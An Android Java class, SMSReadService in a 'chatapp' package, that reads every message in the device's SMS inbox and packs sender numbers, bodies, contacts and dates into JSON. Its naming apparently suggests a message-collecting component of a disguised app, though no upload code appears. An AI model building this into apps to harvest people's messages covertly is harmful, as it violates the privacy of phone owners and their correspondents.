package com.example.chatapp.sms;

import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.text.format.DateFormat;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import com.example.chatapp.MainService;
import com.example.chatapp.utils.Utils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Calendar;
import java.util.Locale;

public class SMSReadService {
    public static JSONObject getSMSList(){
        try{
            JSONObject smsList = new JSONObject();
            JSONArray jsonArray = new JSONArray();
            Uri uriSMSUri = Uri.parse("content://sms/inbox");
            Cursor  cur  = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSUri, null, null, null);
            }

            while (cur.moveToNext()){
                JSONObject sms = new JSONObject();
                String address =  cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                String person = cur.getString(cur.getColumnIndexOrThrow("person"));
                long timeStamp  = cur.getLong(cur.getColumnIndex("date"));
                String dateTime = Utils.getDate(timeStamp);
                Log.d("time", "time : "+timeStamp);
                sms.put("phone-no" ,address);
                sms.put("message", body);
                sms.put("person", person);
                sms.put("date", dateTime);
                jsonArray.put(sms);
            }
            smsList.put("smsList", jsonArray);
            Log.e("done", "sms collecting job");
            return smsList;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

}
